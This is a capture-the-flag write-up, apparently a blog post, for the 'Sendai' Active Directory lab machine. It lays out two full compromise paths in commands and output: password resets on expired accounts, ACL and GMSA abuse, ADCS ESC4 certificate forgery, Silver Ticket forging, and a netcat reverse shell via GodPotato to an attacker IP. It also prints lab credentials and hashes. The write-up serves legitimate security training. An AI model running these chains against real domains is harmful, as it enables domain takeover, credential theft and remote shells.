---
title: "HTB - Sendai"
date: 2026-03-24
categories: [VL, VL-AD]
tags: [Windows, AD, GMSA, ADCS, ESC4, ACL-Abuse, Silver-Ticket, SeImpersonatePrivilege, Ligolo, GodPotato]
image:
  path: /assets/img/sendai/sendai-banner.png
---



---
## Reconnaissance

### Port Scan

```bash
rustscan -a 10.129.7.193 -- -sC -sV
```

```text
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Classic DC fingerprint. Domain is `sendai.vl`, hostname is `dc.sendai.vl`. Hosts file first:

```bash
nxc smb 10.129.7.193 --generate-hosts-file host
cat host | sudo tee -a /etc/hosts
```

---

## SMB Enumeration

```bash
nxc smb 10.129.7.193 -u guest -p '' --shares
```

```text
SMB  10.129.7.193  445  DC  Share    Permissions  Remark
SMB  10.129.7.193  445  DC  -----    -----------  ------
SMB  10.129.7.193  445  DC  config
SMB  10.129.7.193  445  DC  IPC$     READ         Remote IPC
SMB  10.129.7.193  445  DC  sendai   READ         company share
SMB  10.129.7.193  445  DC  Users    READ
```

![sendai-smb-shares](/assets/img/sendai/sendai-smb-shares.png)

Two non-standard shares readable as guest — `sendai` and `Users`. The `sendai` share is the interesting one:

```bash
smbclient \\\\10.129.7.193\\sendai
```

```text
smb: \> ls
  hr                D
  incident.txt      A
  it                D
  legal             D
  security          D
  transfer          D
```

`incident.txt` is the key find — a company-wide notice confirming that accounts with weak passwords have been **expired**:

```text
...we conducted a thorough penetration test, which revealed that a significant number
of user accounts have weak and insecure passwords...All user accounts with insecure
passwords have been expired as a precautionary measure. This means that affected users
will be required to change their passwords upon their next login.
```

Accounts with `STATUS_PASSWORD_MUST_CHANGE` can have their passwords reset via SMB without knowing the current one. That's our opening.

---

## User Enumeration & Password Reset

`IPC$` read access means RID cycling works:

```bash
nxc smb 10.129.7.193 -u guest -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee users.txt
```

Spray the user list with an empty password to surface expired accounts:

```bash
nxc smb 10.129.7.193 -u users.txt -p '' --continue
```

```text
[-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE
[-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE
```

![sendai-expired-accounts](/assets/img/sendai/sendai-expired-accounts.png)

Reset both:

```bash
nxc smb 10.129.7.193 -u Elliot.Yates -p '' -M change-password -o NEWPASS=Password1
nxc smb 10.129.7.193 -u Thomas.Powell -p '' -M change-password -o NEWPASS=Password1
```

![sendai-password-reset](/assets/img/sendai/sendai-password-reset.png)

Credentials: `Elliot.Yates:Password1` / `Thomas.Powell:Password1`

---

## BloodHound Enumeration

```bash
rusthound-ce -d sendai.vl -u Elliot.Yates -p Password1 -c All --zip
```

![sendai-bloodhound-1](/assets/img/sendai/sendai-bloodhound-1.png)

![sendai-bloodhound-2](/assets/img/sendai/sendai-bloodhound-2.png)

The graph surfaces a clean chain:

```text
ELLIOT.YATES → MemberOf → support
support → GenericAll → ADMSVC
ADMSVC members → ReadGMSAPassword → MGTSVC$
```

> **Note:** Same path is available from `Thomas.Powell`.

---

## Path 1 — ADCS ESC4 (Intended)

### ACL Abuse → GMSA Password

`support` has `GenericAll` over `ADMSVC` — add `Elliot.Yates` to the group directly:

```bash
bloodyAD --host sendai.vl -u Elliot.Yates -p Password1 -d sendai.vl add groupMember ADMSVC Elliot.Yates
```

```text
[+] Elliot.Yates added to ADMSVC
```

Now read the GMSA password for `mgtsvc$`:

```bash
nxc ldap 10.129.7.193 -u Elliot.Yates -p Password1 --gmsa
```

```text
Account: mgtsvc$    NTLM: 1cee4a65ef4459e44eb0031cc640ba18
```

![sendai-gmsa](/assets/img/sendai/sendai-gmsa.png)

### Foothold as mgtsvc$

```bash
ewp -i sendai.vl -u 'mgtsvc$' -H 1cee4a65ef4459e44eb0031cc640ba18
```

> **Note:** `ewp` is [evil-winrm-py](https://github.com/adityatelange/evil-winrm-py) — the Python port of evil-winrm.

Run PrivescCheck to hunt for misconfigurations:

```powershell
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```

```text
Name      : Support
ImagePath : C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs
User      : LocalSystem
StartMode : Automatic
```

![sendai-privesccheck](/assets/img/sendai/sendai-privesccheck.png)

Cleartext credentials for `clifford.davey` hardcoded in a service binary's `ImagePath`. BloodHound shows where this leads:

```text
CLIFFORD.DAVEY → MemberOf → CA-OPERATORS → GenericAll → SENDAICOMPUTER (cert template)
```

![sendai-bloodhound-caoperators](/assets/img/sendai/sendai-bloodhound-caoperators.png)

### ESC4 — Certificate Template Write Abuse

ESC4 abuses dangerous write permissions over a certificate template. `CA-OPERATORS` holds `GenericAll` over `SendaiComputer`, meaning `clifford.davey` can rewrite its attributes — specifically enabling `ENROLLEE_SUPPLIES_SUBJECT` to flip it into an ESC1-vulnerable state.

Confirm with certipy:

```bash
certipy find -u clifford.davey -p 'RFmoB2WplgE_3p' -target DC.sendai.vl -vuln -stdout
```

```text
Template Name               : SendaiComputer
Client Authentication       : True
Enrollee Supplies Subject   : False
  Object Control Permissions
    Full Control Principals : SENDAI.VL\ca-operators
[!] Vulnerabilities
  ESC4 : User has dangerous permissions.
```

![sendai-esc4](/assets/img/sendai/sendai-esc4.png)

Back up the current config, then overwrite it with ESC1-compatible defaults:

```bash
certipy template -u clifford.davey -p 'RFmoB2WplgE_3p' -target DC.sendai.vl -template SendaiComputer -save-configuration sendai_backup.json
certipy template -u clifford.davey -p 'RFmoB2WplgE_3p' -target DC.sendai.vl -dc-ip 10.129.7.193 -template SendaiComputer -write-default-configuration -force
```

![sendai-template-overwrite](/assets/img/sendai/sendai-template-overwrite.png)

Authentication fails — modern AD validates both the UPN and the Object SID embedded in the certificate. Without the correct SID, `certipy auth` returns "Object SID mismatch". Recover the Administrator SID:

```bash
lookupsid.py clifford.davey:'RFmoB2WplgE_3p'@DC.sendai.vl
```

Re-request with the SID embedded:

```bash
certipy req -u clifford.davey -p 'RFmoB2WplgE_3p' -target DC.sendai.vl -dc-ip 10.129.7.193 -ca sendai-DC-CA -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500
```

Authenticate with the certificate:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.7.193
```

```text
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106fe
```

![sendai-admin-hash](/assets/img/sendai/sendai-admin-hash.png)

Domain fully compromised via ADCS ESC4.

---

## Path 2 — Silver Ticket → MSSQL → GodPotato (Unintended)

### SQL Credentials from Config Share

After resetting `Elliot.Yates`'s password, the `config` share becomes readable:

```bash
nxc smb 10.129.7.193 -u Elliot.Yates -p Password1 --shares
```

![sendai-config-share](/assets/img/sendai/sendai-config-share.png)

```bash
smbclient \\\\10.129.7.193\\config -U Elliot.Yates%Password1
```

```text
smb: \> ls
  .sqlconfig    A    78
```

```text
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
```

Credentials: `sqlsvc:SurenessBlob85`

### MSSQL Tunnel via Ligolo-ng

MSSQL wasn't in the initial scan — it's only bound to localhost. Confirm from the `mgtsvc$` foothold:

```powershell
netstat -ano | findstr ":1433"
```

```text
TCP    0.0.0.0:1433    0.0.0.0:0    LISTENING    4964
```

Stand up a Ligolo-ng tunnel to reach it:

```bash
ligolo-ng » ifcreate --name ligolo
ligolo-ng » route_add --name ligolo --route 240.0.0.1/32
```

```powershell
.\agent.exe -connect 10.10.15.77:11601 -ignore-cert
```

```bash
[Agent : SENDAI\mgtsvc$@dc] » start
```

### Silver Ticket Forgery

A Silver Ticket is a forged TGS crafted entirely offline using the service account's NT hash — no DC interaction required. We forge a ticket impersonating `Administrator` against the `MSSQL/dc.sendai.vl` SPN using `sqlsvc`'s hash:

```bash
echo -n 'SurenessBlob85' | iconv -t UTF-16LE | openssl dgst -md4
```

```text
MD4(stdin)= 58655c0b90b2492f84fb46fa78c2d96a
```

```bash
ticketer.py -spn MSSQL/dc.sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash 58655c0b90b2492f84fb46fa78c2d96a -dc-ip dc.sendai.vl Administrator -domain sendai.vl
```

![sendai-silver-ticket](/assets/img/sendai/sendai-silver-ticket.png)

Connect using the forged ticket:

```bash
mssqlclient.py -k -no-pass sendai.vl/Administrator@dc.sendai.vl -dc-ip 240.0.0.1 -windows-auth
```

```text
SQL (SENDAI\Administrator  dbo@master)>
```

`SeImpersonatePrivilege` is enabled on the MSSQL process. Get a shell through `xp_cmdshell` via a hoaxshell stager:

```bash
uv run hoaxshell.py -s 10.10.15.77 -p 4444
```

![sendai-hoaxshell](/assets/img/sendai/sendai-hoaxshell.png)

GodPotato closes it out:

```bash
./gp.exe -cmd "C:\programdata\nc.exe 10.10.15.77 4445 -e cmd"
```

![sendai-system](/assets/img/sendai/sendai-system.png)

SYSTEM via Silver Ticket → MSSQL → SeImpersonatePrivilege.

---

## Attack Flow

```text
    	                                   sendai.vl
    	                                       |
    	                           [Guest SMB — sendai share]
    	                        incident.txt → expired accounts
    	                                       |
    	                           [RID Cycling + null spray]
    	                          Elliot.Yates / Thomas.Powell
    	                          STATUS_PASSWORD_MUST_CHANGE
    	                                       |
    	                             [nxc change-password]
    	                             Elliot.Yates:Password1
    	                                       |
    	                                  [BloodHound]
    	                         support → GenericAll → ADMSVC
    	                      ADMSVC → ReadGMSAPassword → mgtsvc$
    	                                       |
    	                              --- Path 1: ESC4 ---
    	                               bloodyAD → ADMSVC
    	                        ReadGMSAPassword → mgtsvc$ shell
    	                         PrivescCheck → clifford.davey
    	                              CA-OPERATORS → ESC4
    	                           certipy template overwrite
    	                             certipy req -upn -sid
    	                           certipy auth → Admin hash
    	                                       |
    	                         --- Path 2: Silver Ticket ---
    	                           config share → .sqlconfig
    	                             sqlsvc:SurenessBlob85
    	                             Ligolo-ng → MSSQL:1433
    	                           ticketer.py → Admin ccache
    	                               mssqlclient.py -k
    	                            xp_cmdshell → hoaxshell
    	                               GodPotato → SYSTEM
    	                                       |
    	                                     SYSTEM
```
